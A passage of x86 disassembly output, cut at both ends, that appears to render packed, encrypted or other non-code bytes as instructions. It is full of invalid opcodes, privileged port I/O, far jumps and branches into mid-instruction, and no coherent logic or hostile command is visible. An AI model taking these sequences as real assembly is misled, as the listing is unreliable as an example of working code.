  409337:	vpsrld xmm4,xmm1,XMMWORD PTR [eax-0x36c7420e]
  40933f:	mov    cl,0x30
  409341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409342:	inc    ecx
  409343:	inc    esi
  409344:	cmp    DWORD PTR [eax+0x1f9345a],ebp
  40934a:	pop    ebx
  40934b:	cld    
  40934c:	push   ax
  40934e:	sbb    DWORD PTR [edx-0x388ad7a2],esp
  409354:	test   eax,0xccd052c2
  409359:	add    dh,BYTE PTR [ebx]
  40935b:	xchg   esi,eax
  40935c:	jp     0x40936d
  40935e:	les    ecx,FWORD PTR ds:0x3150c3ce
  409364:	in     al,0xcd
  409366:	cdq    
  409367:	dec    eax
  409368:	mov    ebp,0xf29b9f11
  40936d:	pop    edi
  40936e:	jno    0x409311
  409370:	push   0x434c2050
  409375:	push   edi
  409376:	jp     0x409347
  409378:	dec    edi
  409379:	inc    esp
  40937a:	jo     0x409381
  40937c:	rcr    BYTE PTR [edi-0x21ee744d],1
  409382:	test   eax,0x1847b92e
  409387:	push   ebx
  409388:	inc    esi
  409389:	neg    DWORD PTR [ecx+0xa]
  40938c:	jge    0x409370
  40938e:	add    BYTE PTR fs:[ebx],cl
  409391:	jns    0x409353
  409393:	popa   
  409394:	jnp    0x409350
  409396:	in     al,0x4b
  409398:	rol    DWORD PTR [eax],1
  40939a:	scas   eax,DWORD PTR es:[edi]
  40939b:	xor    BYTE PTR [eax-0x1f],al
  40939e:	dec    ecx
  40939f:	dec    ebp
  4093a0:	and    DWORD PTR [edi],esp
  4093a2:	pop    es
  4093a3:	cmp    eax,0x9f24423
  4093a8:	pusha  
  4093a9:	lods   eax,DWORD PTR ds:[esi]
  4093aa:	sub    BYTE PTR [eax-0x7],cl
  4093ad:	lock mov ebx,0xe86d1083
  4093b3:	and    eax,0xefdb768f
  4093b8:	outs   dx,BYTE PTR ds:[esi]
  4093b9:	fs cli 
  4093bb:	out    0x88,eax
  4093bd:	imul   edi,DWORD PTR ds:0x189cfa48,0x67abbf9a
  4093c7:	inc    ebx
  4093c8:	and    eax,0x86e8b7f5
  4093cd:	sbb    al,0x4a
  4093cf:	sbb    al,0xfd
  4093d1:	outs   dx,DWORD PTR ds:[esi]
  4093d2:	xor    ecx,DWORD PTR [ebp-0x76acc2c9]
  4093d8:	xchg   esp,eax
  4093d9:	stos   BYTE PTR es:[edi],al
  4093da:	sbb    dh,BYTE PTR [ebp-0x3822025d]
  4093e0:	loopne 0x409460
  4093e2:	popf   
  4093e3:	pop    es
  4093e4:	and    eax,DWORD PTR [esi+0x3af6d827]
  4093ea:	fidivr WORD PTR [ebp-0x37ce4467]
  4093f0:	xchg   esp,eax
  4093f1:	enter  0x7a9e,0x90
  4093f5:	lahf   
  4093f6:	scas   eax,DWORD PTR es:[edi]
  4093f7:	add    al,al
  4093f9:	lock bound eax,QWORD PTR [edx+0x3898e51d]
  409400:	mov    BYTE PTR [edx+0x22cf5f58],al
  409406:	pop    esp
  409407:	int3   
  409408:	add    dh,dl
  40940a:	icebp  
  40940b:	push   esi
  40940c:	inc    edi
  40940d:	adc    al,0x1e
  40940f:	mov    ch,0xf6
  409411:	xor    eax,0x539f83
  409416:	mov    cl,0xdd
  409418:	cld    
  409419:	stos   DWORD PTR es:[edi],eax
  40941a:	or     edx,DWORD PTR [edx]
  40941c:	and    ebx,DWORD PTR [ebp+0x272a2257]
  409422:	and    ah,0x24
  409425:	dec    edi
  409426:	fcom   DWORD PTR [ecx-0x13]
  409429:	mov    bh,0x21
  40942b:	test   eax,0xa2f045c4
  409430:	ins    BYTE PTR es:[edi],dx
  409431:	pop    ss
  409432:	ja     0x4093f6
  409434:	and    ah,ah
  409436:	push   edx
  409437:	xlat   BYTE PTR ds:[ebx]
  409438:	stos   DWORD PTR es:[edi],eax
  409439:	sub    eax,0x271bf5a7
  40943e:	rcl    BYTE PTR [edi+0x3d],cl
  409441:	pop    edi
  409442:	mov    edi,0xeb1a246d
  409447:	push   es
  409448:	and    eax,DWORD PTR [eax]
  40944a:	sahf   
  40944b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40944c:	pop    ebp
  40944d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40944e:	jno    0x4093da
  409450:	imul   ecx,DWORD PTR [ecx+0x170a2f49],0x3361cfd1
  40945a:	aaa    
  40945b:	sub    BYTE PTR [edi],0x1d
  40945e:	adc    esi,ebx
  409460:	sub    al,BYTE PTR [edi]
  409462:	dec    esp
  409463:	repnz imul esp,DWORD PTR [ebx-0x61],0x74576a61
  40946b:	xor    DWORD PTR [esi],eax
  40946d:	out    0xd3,eax
  40946f:	repz bound ebp,QWORD PTR [eax]
  409472:	gs push edx
  409474:	les    ecx,FWORD PTR [esi-0x61]
  409477:	icebp  
  409478:	mov    DWORD PTR [esi-0x5c256a7c],ecx
  40947e:	call   0xef23:0xb7b5
  409484:	ds (bad) 
  409486:	popa   
  409487:	neg    eax
  409489:	sahf   
  40948a:	test   edx,eax
  40948c:	sbb    al,0x61
  40948e:	xor    BYTE PTR [edx+0x50eb9157],bl
  409494:	mov    ch,0x8f
  409496:	lds    ebx,FWORD PTR [edx]
  409498:	mov    eax,0x17961b45
  40949d:	arpl   WORD PTR [ecx-0x11fd122c],bp
  4094a3:	fxch   st(6)
  4094a5:	fmul   QWORD PTR ds:0xd3d03ef3
  4094ab:	adc    cl,BYTE PTR [esi]
  4094ad:	adc    ch,dh
  4094af:	mov    ds:0x81087736,eax
  4094b4:	repnz (bad) [ecx-0x7e98eaca]
  4094bb:	ret    0x306c
  4094be:	mov    eax,ds:0xb2be0be3
  4094c3:	dec    ebp
  4094c4:	push   0x1
  4094c6:	inc    ecx
  4094c7:	inc    esp
  4094c8:	mov    al,0x6b
  4094ca:	imul   edx
  4094cc:	retf   
  4094cd:	xor    BYTE PTR [esi+0x3c],ch
  4094d0:	jbe    0x40952c
  4094d2:	stc    
  4094d3:	jnp    0x4094ee
  4094d5:	push   ss
  4094d6:	mov    fs,edx
  4094d8:	push   edx
  4094d9:	cmp    eax,ebx
  4094db:	bnd jp 0x4094bf
  4094de:	xchg   ebp,eax
  4094df:	adc    eax,DWORD PTR [ecx+eiz*4-0x51]
  4094e3:	fdiv   DWORD PTR [ecx]
  4094e5:	inc    ebp
  4094e6:	pop    ss
  4094e7:	fwait
  4094e8:	mov    edi,edi
  4094ea:	and    al,0x1f
  4094ec:	mov    edi,0x329bea76
  4094f1:	pop    di
  4094f3:	(bad)  
  4094f5:	daa    
  4094f6:	cmp    eax,0xc7b2b0b
  4094fb:	jnp    0x4094eb
  4094fd:	adc    dh,dl
  4094ff:	lds    ebp,FWORD PTR [ebp-0x628eac53]
  409505:	adc    edx,DWORD PTR [esi+0x10]
  409508:	inc    edx
  409509:	lahf   
  40950a:	ds push ebp
  40950c:	dec    ebp
  40950d:	or     BYTE PTR [edx-0x52],ch
  409510:	dec    edi
  409511:	push   ss
  409512:	dec    ecx
  409513:	adc    DWORD PTR [ecx],ebp
  409515:	xchg   ebx,eax
  409516:	mov    ds:0x7ded8fef,eax
  40951b:	mov    DWORD PTR [edi+0x499860ae],ecx
  409521:	add    ebp,eax
  409523:	cmp    eax,0x33d31a10
  409528:	mov    cl,0x69
  40952a:	rol    DWORD PTR [eax-0x60],0xb0
  40952e:	push   cs
  40952f:	mov    ah,BYTE PTR [eax-0x7]
  409532:	cmp    eax,0x95a6d68a
  409537:	xor    al,0x8d
  409539:	hlt    
  40953a:	mov    ds:0xea472569,eax
  40953f:	adc    dl,ch
  409541:	xchg   ecx,eax
  409542:	or     ah,BYTE PTR [esi-0x31]
  409545:	add    ah,cl
  409547:	fiadd  WORD PTR [ebx+0x6b]
  40954a:	out    0x5b,eax
  40954c:	es call 0x5d7e3c6d
  409552:	sbb    al,0x3d
  409554:	test   eax,0xd6fc13b0
  409559:	mov    bh,0x7c
  40955b:	ret    0x1c2a
  40955e:	enter  0xe7a4,0xb0
  409562:	fild   QWORD PTR [ecx+0x28]
  409565:	(bad)  
  409566:	dec    esp
  409567:	ficomp DWORD PTR [edi-0x9]
  40956a:	sbb    al,0x50
  40956c:	inc    ebp
  40956d:	fcmovnu st,st(0)
  40956f:	punpcklbw mm7,DWORD PTR [edx-0x69f84ba2]
  409576:	sub    BYTE PTR [ecx-0x1d],0xed
  40957a:	adc    cl,BYTE PTR [ecx]
  40957c:	sbb    BYTE PTR [ebx],dl
  40957e:	add    DWORD PTR [esi+0x7ed48ef4],esi
  409584:	ja     0x409603
  409586:	sub    cl,BYTE PTR [ecx+0x17]
  409589:	dec    esp
  40958a:	cwde   
  40958b:	or     DWORD PTR [edx],esp
  40958d:	mov    ds:0xdf1eae1c,eax
  409592:	pop    ebx
  409593:	idiv   DWORD PTR [ecx-0x632f6b01]
  409599:	shr    cl,0x56
  40959c:	lea    edi,[ecx+0x1e]
  40959f:	mov    BYTE PTR [esi+0x18958c41],al
  4095a5:	inc    esp
  4095a6:	mov    ds:0xbae3f956,eax
  4095ab:	stos   BYTE PTR es:[edi],al
  4095ac:	jbe    0x4095b3
  4095ae:	cmp    BYTE PTR [edx+ecx*2+0x5e5f970f],al
  4095b5:	push   ebp
  4095b6:	fldln2 
  4095b8:	fild   QWORD PTR [edi-0x25]
  4095bb:	mov    DWORD PTR [ecx],esp
  4095bd:	pop    esi
  4095be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095bf:	aam    0xdd
  4095c1:	fld    QWORD PTR ds:0xa620263d
  4095c7:	ss jnp 0x409562
  4095ca:	sbb    edx,DWORD PTR [ebx]
  4095cc:	mov    edi,0x65e23dd5
  4095d1:	cmovne ebx,edi
  4095d4:	aas    
  4095d5:	(bad)  
  4095d6:	cmp    dh,al
  4095d8:	cmp    eax,0x6c280041
  4095dd:	repnz rcl bh,1
  4095e0:	jge    0x4095ca
  4095e2:	push   ebx
  4095e3:	or     ebp,ebp
  4095e5:	jg     0x409661
  4095e7:	das    
  4095e8:	xchg   BYTE PTR [ecx],al
  4095ea:	mov    ebp,0x6a385162
  4095ef:	leave  
  4095f0:	jle    0x409660
  4095f2:	neg    BYTE PTR [edi]
  4095f4:	adc    DWORD PTR ss:[eax+0x335d4e3c],edi
  4095fb:	rcr    BYTE PTR [ecx+0x5cf6dfdd],1
  409601:	xchg   BYTE PTR [esi+0x41a3b7e6],cl
  409607:	xchg   ebx,eax
  409608:	les    ebp,FWORD PTR [edi+0x73]
  40960b:	test   BYTE PTR [edi],ah
  40960d:	adc    al,0xec
  40960f:	jbe    0x4095e0
  409611:	rol    DWORD PTR [ebp+0x6b],cl
  409614:	aaa    
  409615:	or     ah,BYTE PTR [ebx+0x62]
  409618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409619:	xchg   esp,eax
  40961a:	inc    esi
  40961b:	xor    eax,0xa2763669
  409620:	shl    DWORD PTR [edi+0x2f],0x76
  409624:	adc    ebx,DWORD PTR [esi+edi*1]
  409627:	lahf   
  409628:	popa   
  409629:	or     esp,edi
  40962b:	scas   eax,DWORD PTR es:[edi]
  40962c:	clc    
  40962d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40962e:	outs   dx,DWORD PTR ds:[esi]
  40962f:	jmp    0x8247cfa9
  409634:	es jg  0x4095c1
  409637:	mov    al,0xa
  409639:	stos   DWORD PTR es:[edi],eax
  40963a:	test   al,0x6b
  40963c:	loop   0x40966a
  40963e:	pusha  
  40963f:	(bad)  
  409640:	out    dx,eax
  409641:	dec    edi
  409642:	lahf   
  409643:	xor    ebp,DWORD PTR [eax]
  409645:	jb     0x4095dc
  409647:	lahf   
  409648:	xor    DWORD PTR [eax+0x66f66ce4],0x600df51d
  409652:	adc    DWORD PTR [ecx-0x379ff956],edi
  409658:	fldcw  WORD PTR ds:0x709d6b7f
  40965e:	ret    
  40965f:	pop    ss
  409660:	(bad)  
  409661:	outs   dx,BYTE PTR ds:[esi]
  409662:	pop    eax
  409663:	add    bh,ah
  409665:	call   FWORD PTR [edx-0x57]
  409668:	fcmovb st,st(3)
  40966a:	out    0x27,eax
  40966c:	nop
  40966d:	out    0x5b,al
  40966f:	jg     0x4096e4
  409671:	loop   0x4096c7
  409673:	mov    esi,0xd426a877
  409678:	lock sub bl,ah
  40967b:	mov    ecx,DWORD PTR [eax]
  40967d:	fst    QWORD PTR [ecx-0x29]
  409680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409681:	in     eax,dx
  409682:	push   edx
  409683:	and    DWORD PTR [eax],0x3ed7afcd
  409689:	(bad)  
  40968b:	lock loope 0x4096d7
  40968e:	daa    
  40968f:	jge    0x4096a8
  409691:	and    edi,edi
  409693:	xor    al,BYTE PTR [esi+0x3e48ae75]
  409699:	mov    DWORD PTR [ebx],ebp
  40969b:	scas   eax,DWORD PTR es:[edi]
  40969c:	add    DWORD PTR [eax-0x34],0x3e
  4096a0:	lea    esp,[eax-0x2b3fbcb3]
  4096a6:	sbb    eax,0xcf2046c9
  4096ab:	pop    eax
  4096ac:	push   esi
  4096ad:	in     eax,dx
  4096ae:	add    bh,BYTE PTR [ecx-0xd]
  4096b1:	es dec edx
  4096b3:	sbb    eax,0xc502a2dc
  4096b8:	jecxz  0x409732
  4096ba:	repz mov ah,0xe7
  4096bd:	loop   0x409642
  4096bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096c0:	retf   
  4096c1:	or     DWORD PTR [edx+eax*8-0x2c],0x41
  4096c6:	enter  0xb319,0x2b
  4096ca:	(bad)  
  4096cb:	cmp    DWORD PTR [esi+0x5a7f4498],ebp
  4096d1:	push   cs
  4096d2:	xor    eax,0x5f483028
  4096d7:	push   ds
  4096d8:	mov    edi,0x509ad298
  4096dd:	daa    
  4096de:	int    0x11
  4096e0:	dec    esp
  4096e1:	fwait
  4096e2:	aas    
  4096e3:	fsub   QWORD PTR [edx]
  4096e5:	adc    BYTE PTR [eax+0x1aa3bb0e],ch
  4096eb:	pop    edi
  4096ec:	std    
  4096ed:	jno    0x4096f2
  4096ef:	push   ds
  4096f0:	inc    ax
  4096f2:	sub    edi,DWORD PTR [esi]
  4096f4:	icebp  
  4096f5:	mov    gs,WORD PTR [esi+0x110e8554]
  4096fb:	popa   
  4096fc:	cdq    
  4096fd:	loopne 0x40973f
  4096ff:	ret    
  409700:	lock je 0x4096cf
  409703:	out    0xb6,eax
  409705:	adc    bh,BYTE PTR [ebx-0x68df098a]
  40970b:	adc    esi,esp
  40970d:	adc    esp,DWORD PTR [edx-0x2ddc0b87]
  409713:	pop    edi
  409714:	or     ah,0x46
  409717:	push   es
  409718:	cmc    
  409719:	loop   0x4096d9
  40971b:	jb     0x4096fc
  40971d:	or     DWORD PTR [ebp+0x6c],0x7f
  409721:	inc    ebp
  409722:	jecxz  0x409776
  409724:	push   ds
  409725:	stos   DWORD PTR es:[edi],eax
  409726:	jmp    0x40972e
  409728:	popf   
  409729:	imul   edx,DWORD PTR ds:0xb3c198d4,0x87364cc1
  409733:	adc    al,0x1b
  409735:	test   ecx,edi
  409737:	fdiv   st,st(3)
  409739:	xor    ebx,ebx
  40973b:	dec    ebp
  40973c:	mov    al,0xd8
  40973e:	mov    ah,0x1
  409740:	addr16 pop ss
  409742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409743:	sbb    eax,0x9546c7bc
  409748:	push   esp
  409749:	jnp    0x40970f
  40974b:	mov    fs,WORD PTR [eax-0x57a6d67]
  409751:	jbe    0x409742
  409753:	fwait
  409754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409755:	out    0x3f,eax
  409757:	mov    WORD PTR [edx],ds
  409759:	add    BYTE PTR [edx],cl
  40975b:	sub    BYTE PTR ds:0x18b83577,dh
  409761:	leave  
  409762:	add    al,0x2c
  409764:	sbb    esi,esi
  409766:	neg    BYTE PTR cs:[ecx+0x7f66c087]
  40976d:	test   bh,0x10
  409770:	xchg   DWORD PTR [edi-0x79bb6f17],ebp
  409776:	push   edi
  409777:	xchg   esp,eax
  409778:	sub    esp,ebp
  40977a:	jns    0x40978f
  40977c:	int    0xfb
  40977e:	jns    0x4097f3
  409780:	sbb    al,0xee
  409782:	in     al,0x21
  409784:	mov    eax,ds:0x4c0e55ae
  409789:	call   0x988:0x55add0ad
  409790:	push   esi
  409791:	pop    edi
  409792:	push   esi
  409793:	into   
  409794:	(bad)  
  409795:	adc    al,0x81
  409797:	adc    BYTE PTR [esi+eax*8-0x576697be],dh
  40979e:	and    eax,0xfbe87913
  4097a3:	pop    esp
  4097a4:	mov    edx,0x3a25d3a2
  4097a9:	sub    ecx,ebp
  4097ab:	pop    ebx
  4097ac:	and    al,0x3b
  4097ae:	add    al,0x10
  4097b0:	sub    cl,al
  4097b2:	into   
  4097b3:	cmp    bl,dl
  4097b5:	sahf   
  4097b6:	(bad)  [edx+edi*8]
  4097b9:	mov    bh,0x40
  4097bb:	(bad)  
  4097bc:	in     al,0x2
  4097be:	mov    ebx,0x91f63b86
  4097c3:	cmp    dh,bl
  4097c5:	xor    eax,0x8baeac7c
  4097ca:	inc    edx
  4097cb:	hlt    
  4097cc:	mov    edx,0xdc890816
  4097d1:	clc    
  4097d2:	fcomp  DWORD PTR ds:0xda52dd87
  4097d8:	mov    al,ds:0x84941951
  4097dd:	rcl    DWORD PTR [edx+0x49],1
  4097e0:	je     0x409846
  4097e2:	xor    BYTE PTR [eax+0x17fd9da0],ch
  4097e8:	outs   dx,DWORD PTR ds:[esi]
  4097e9:	inc    edx
  4097ea:	pop    esi
  4097eb:	(bad)  
  4097ec:	daa    
  4097ed:	mul    BYTE PTR [ebp+0x3e]
  4097f0:	imul   esi,DWORD PTR ds:0x9a4b186c,0xd9b0c5ce
  4097fa:	repnz adc al,0xef
  4097fd:	push   esi
  4097fe:	test   eax,0x294d4629
  409803:	push   ebx
  409804:	jge    0x409885
  409806:	mov    dl,0xd1
  409808:	push   ebx
  409809:	loopne 0x409833
  40980b:	fisubr DWORD PTR [edi]
  40980d:	popf   
  40980e:	(bad)  
  40980f:	sti    
  409810:	outs   dx,DWORD PTR ds:[esi]
  409811:	sbb    eax,0x3a701e90
  409816:	mov    ah,0xa5
  409818:	(bad)  
  409819:	fsubr  DWORD PTR [ecx+0x38]
  40981c:	mov    edx,0x8a4bf803
  409821:	sbb    al,0xd
  409823:	fistp  WORD PTR [esi]
  409825:	fdivr  st(2),st
  409827:	lods   al,BYTE PTR ds:[esi]
  409828:	rol    bl,0xd7
  40982b:	lods   al,BYTE PTR ds:[esi]
  40982c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40982d:	push   eax
  40982e:	sbb    DWORD PTR [eax+0x39],ebx
  409831:	fidiv  DWORD PTR [edi-0x2a09bcb3]
  409837:	repz mov cl,0x37
  40983a:	loop   0x4098a6
  40983c:	jno    0x409801
  40983e:	or     al,0x8c
  409840:	inc    esp
  409841:	das    
  409842:	mov    al,ds:0xa38c7c1f
  409847:	hlt    
  409848:	popf   
  409849:	xor    cl,BYTE PTR [edi]
  40984b:	xor    eax,0x8757cb5c
  409850:	pushf  
  409851:	lods   al,BYTE PTR ds:[esi]
  409852:	sbb    esi,DWORD PTR [ebx+0x57614af5]
  409858:	sbb    eax,0xc06f787f
  40985d:	xor    BYTE PTR [ecx+0x37],ch
  409860:	imul   edi
  409862:	mov    esi,0x4a06db2a
  409867:	outs   dx,BYTE PTR ds:[esi]
  409868:	es test al,0x4b
  40986b:	sti    
  40986c:	cs and eax,0x3921613f
  409872:	jl     0x409875
  409874:	dec    DWORD PTR [edi-0x56]
  409877:	jno    0x4098df
  409879:	in     eax,dx
  40987a:	jmp    0x409832
  40987c:	test   eax,0x679e977
  409881:	inc    edi
  409882:	icebp  
  409883:	test   eax,0x4b1256f6
  409888:	mov    ebx,0x2afacc20
  40988d:	pop    esp
  40988e:	sar    ch,cl
  409890:	es loopne 0x4098ad
  409893:	inc    ebp
  409894:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409895:	(bad)  
  409896:	mov    edx,0x8cd4f53b
  40989b:	loope  0x40990b
  40989d:	aam    0x95
  40989f:	shr    DWORD PTR [esi],0x12
  4098a2:	mov    dh,0x6
  4098a4:	sbb    eax,0x772e1ff0
  4098a9:	push   cs
  4098aa:	enter  0x5409,0xe3
  4098ae:	outs   dx,DWORD PTR ds:[esi]
  4098af:	arpl   WORD PTR [ebx+0x4c],si
  4098b2:	adc    eax,0xcade140e
  4098b7:	cli    
  4098b8:	stc    
  4098b9:	xor    DWORD PTR [esi],0x1
  4098bc:	push   cs
  4098bd:	mov    ebp,0x732276d7
  4098c2:	ret    0x3d1c
  4098c5:	sub    edi,ebp
  4098c7:	out    dx,al
  4098c8:	cdq    
  4098c9:	lea    edi,[eax+0x555e672e]
  4098cf:	jmp    0x409880
  4098d1:	dec    esi
  4098d2:	cmp    cl,bh
  4098d4:	sti    
  4098d5:	add    bh,BYTE PTR [edi]
  4098d7:	pusha  
  4098d8:	imul   ecx,DWORD PTR [esi+0x41],0xa4268ec2
  4098df:	xchg   ebp,edx
  4098e1:	push   esp
  4098e2:	pop    edx
  4098e3:	jb     0x4098ee
  4098e5:	and    DWORD PTR [edx+ecx*1-0x5b286140],edi
  4098ec:	dec    eax
  4098ed:	push   cs
  4098ee:	lods   al,BYTE PTR ds:[esi]
  4098ef:	adc    ch,BYTE PTR [ebx]
  4098f1:	cmp    eax,0x541513bd
  4098f6:	(bad)  
  4098f7:	xor    ah,BYTE PTR [esi-0x781dd836]
  4098fd:	popa   
  4098fe:	lods   al,BYTE PTR ds:[esi]
  4098ff:	call   0xea63056
  409904:	stos   BYTE PTR es:[edi],al
  409905:	sbb    al,0x1a
  409907:	lahf   
  409908:	ret    0xc2c2
  40990b:	out    dx,al
  40990c:	fs jnp 0x4098cb
  40990f:	test   DWORD PTR [edx-0x1c],esi
  409912:	shr    cl,cl
  409914:	retf   
  409915:	int    0x49
  409917:	retw   
  409919:	lds    esp,FWORD PTR [edi-0x53]
  40991c:	hlt    
  40991d:	push   edi
  40991e:	ret    0xc339
  409921:	lock inc ebp
  409923:	(bad)
  409927:	mov    ecx,0x45fe3bd1
  40992c:	loop   0x409946
  40992e:	(bad)  
  409930:	mov    esi,0xf3bc3876
  409935:	cmp    DWORD PTR [eax],eax
  409937:	sar    BYTE PTR [edx],cl
  409939:	cmc    
  40993a:	mov    edx,0x1955fca4
  40993f:	xor    eax,0x713c4103
  409944:	sub    al,0xd9
  409946:	jecxz  0x40998c
  409948:	adc    bl,BYTE PTR [edi]
  40994a:	push   ds
  40994b:	jne    0x4098d6
  40994d:	inc    eax
  40994e:	retf   
  40994f:	test   edi,eax
  409951:	out    0x47,al
  409953:	div    esi
  409955:	sub    ebx,DWORD PTR [esi+0x63]
  409958:	pop    ecx
  409959:	sub    esp,DWORD PTR [esi+0x534d564e]
  40995f:	or     bl,BYTE PTR [eax+0x73]
  409962:	(bad)  
  409963:	stc    
  409964:	ret    0x1b7e
  409967:	or     bl,BYTE PTR [edi+edx*8-0x73]
  40996b:	sbb    al,al
  40996d:	retf   0xc2e7
  409970:	xchg   edx,eax
  409971:	pop    ecx
  409972:	pop    esp
  409973:	jmp    0x40995d
  409975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409976:	jne    0x40991c
  409978:	mov    ecx,0x8b591c5c
  40997d:	int3   
  40997e:	lods   al,BYTE PTR ds:[esi]
  40997f:	lods   al,BYTE PTR ds:[esi]
  409980:	xchg   esp,eax
  409981:	out    dx,al
  409982:	scas   al,BYTE PTR es:[edi]
  409983:	xchg   esp,eax
  409984:	cmp    DWORD PTR [ebx+0x17],0x5f468d05
  40998b:	sbb    bh,BYTE PTR [ecx+0x8a4278]
  409991:	push   esp
  409992:	pop    ebx
  409993:	push   edx
  409994:	pop    ebx
  409995:	fsub   QWORD PTR [esi-0x6a7c24bf]
  40999b:	fistp  WORD PTR [esi+ebp*4+0x20]
  40999f:	cmc    
  4099a0:	xchg   bh,al
  4099a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099a3:	or     DWORD PTR [esi+0x47],0xffffffe0
  4099a7:	test   al,0xbf
  4099a9:	push   edx
  4099aa:	add    al,0x11
  4099ac:	jmp    0x12afb92
  4099b1:	mov    ebp,0x9cc2102c
  4099b6:	enter  0x2748,0x8e
  4099ba:	jp     0x409a31
  4099bc:	mov    ch,bh
  4099be:	hlt    
  4099bf:	fs mul ah
  4099c2:	(bad)  
  4099c3:	or     al,0x3a
  4099c5:	fcomp  QWORD PTR [ebp-0x75]
  4099c8:	jae    0x4099c0
  4099ca:	icebp  
  4099cb:	loope  0x409961
  4099cd:	mov    esi,0xb7695b00
  4099d2:	mul    BYTE PTR [edi-0x33]
  4099d5:	jg     0x4099d8
  4099d7:	int    0x4a
  4099d9:	jmp    0x409a2f
  4099db:	jmp    0x4099fe
  4099dd:	stc    
  4099de:	inc    ebp
  4099df:	pop    ds
  4099e0:	push   esi
  4099e1:	mov    bl,0x4b
  4099e3:	mov    ebx,0xc5b61b55
  4099e8:	mov    bh,0xf8
  4099ea:	add    eax,0x826a647e
  4099ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099f0:	je     0x4099bd
  4099f2:	jg     0x40999d
  4099f4:	push   es
  4099f5:	mov    ebx,0xf48e8e72
  4099fa:	mov    ebx,0x118a356f
  4099ff:	das    
  409a00:	sbb    ch,BYTE PTR [edi]
  409a02:	test   al,0x4d
  409a04:	or     BYTE PTR [esi],ch
  409a06:	adc    BYTE PTR [ebp-0x28],al
  409a09:	pushf  
  409a0a:	jmp    DWORD PTR [edi+0x78]
  409a0d:	in     eax,0x8
  409a0f:	mov    bl,0xf1
  409a11:	mov    dh,bl
  409a13:	bnd jo 0x4099ea
  409a16:	inc    ebp
  409a17:	call   0x33:0x76acc0eb
  409a1e:	or     bl,BYTE PTR [eax-0x21fed1d9]
  409a24:	add    bl,ah
  409a26:	aaa    
  409a27:	icebp  
  409a28:	and    BYTE PTR [eax-0x5a],bh
  409a2b:	sbb    DWORD PTR [eax-0x6d37909f],0x24
  409a32:	dec    edx
  409a33:	das    
  409a34:	ja     0x409a6c
  409a36:	cdq    
  409a37:	clc    
  409a38:	in     eax,dx
  409a39:	adc    BYTE PTR [eax-0x2403046a],cl
  409a3f:	adc    bl,BYTE PTR [edi]
  409a41:	xor    DWORD PTR [edi+0x4b255e56],eax
  409a47:	xchg   BYTE PTR [edi+0x46],dl
  409a4a:	popf   
  409a4b:	aam    0x85
  409a4d:	jmp    0x4908:0x88fd6c8f
  409a54:	push   es
  409a55:	fcomp  QWORD PTR [eax+0x4e]
  409a58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a59:	imul   eax,DWORD PTR [edx-0x32],0xf34ef7fc
  409a60:	pusha  
  409a61:	out    0xf8,al
  409a63:	add    eax,ebp
  409a65:	imul   ecx,DWORD PTR [ebx-0x68729060],0x15909ec3
  409a6f:	sub    dl,ah
  409a71:	imul   edi,DWORD PTR [edx+0x25fcd9c2],0x7cff8c04
  409a7b:	lds    esi,FWORD PTR [edx-0x75]
  409a7e:	push   edx
  409a7f:	pushf  
  409a80:	push   cs
  409a81:	dec    eax
  409a82:	mov    ch,0x12
  409a84:	popa   
  409a85:	push   es
  409a86:	lods   eax,DWORD PTR ds:[esi]
  409a87:	in     al,dx
  409a88:	dec    esp
  409a89:	jne    0x409aae
  409a8b:	test   BYTE PTR [eax-0x45],bl
  409a8e:	lods   eax,DWORD PTR ds:[esi]
  409a8f:	scas   al,BYTE PTR es:[edi]
  409a90:	in     al,dx
  409a91:	mov    ds:0xcd1b4272,al
  409a96:	call   0xae87ad3e
  409a9b:	dec    esp
  409a9c:	data16 jecxz 0x409a57
  409a9f:	(bad)  
  409aa0:	fild   DWORD PTR [esi]
  409aa2:	inc    ebp
  409aa3:	nop
  409aa4:	jb     0x409b13
  409aa6:	sbb    BYTE PTR ds:0xfff6ef9a,bl
  409aac:	sub    DWORD PTR [esi+edx*2+0x11edeb65],ebx
  409ab3:	jnp    0x409ae7
  409ab5:	jp     0x409aeb
  409ab7:	(bad)  
  409ab8:	mov    eax,ebp
  409aba:	lea    ebx,[esi]
  409abc:	xchg   esi,eax
  409abd:	ret    0xa260
  409ac0:	lock dec ecx
  409ac2:	aam    0x55
  409ac4:	mov    esi,0xc73ff31a
  409ac9:	(bad)  
  409aca:	shl    dh,1
  409acc:	arpl   dx,bx
  409ace:	mov    edx,0xfd6b5f9f
  409ad3:	pop    ecx
  409ad4:	das    
  409ad5:	mov    eax,0x2dcc9d79
  409ada:	clc    
  409adb:	lahf   
  409adc:	popf   
  409add:	inc    ecx
  409ade:	les    ebp,FWORD PTR [ecx+ebp*4+0x41]
  409ae2:	inc    ecx
  409ae3:	int3   
  409ae4:	ret    0x63be
  409ae7:	mov    ss,WORD PTR [edi]
  409ae9:	das    
  409aea:	stc    
  409aeb:	js     0x409add
  409aed:	xchg   eax,edi
  409aef:	sbb    eax,0x36a353ac
  409af4:	and    bh,cl
  409af6:	jmp    0xe960:0xa7e93e4b
  409afd:	rol    BYTE PTR [edi+ecx*2+0x10],cl
  409b01:	test   BYTE PTR [ecx+ebx*4+0x352f514b],al
  409b08:	test   DWORD PTR [esi+0x69363997],edi
  409b0e:	mov    edi,0xc4be9aff
  409b13:	fst    QWORD PTR [ecx]
  409b15:	sbb    ah,BYTE PTR [esi-0x3279dc7d]
  409b1b:	dec    esi
  409b1c:	retf   
  409b1d:	aaa    
  409b1e:	mov    ch,0xa2
  409b20:	jae    0x409afb
  409b22:	push   ecx
  409b23:	and    bl,dl
  409b25:	jbe    0x409b12
  409b27:	inc    edx
  409b28:	std    
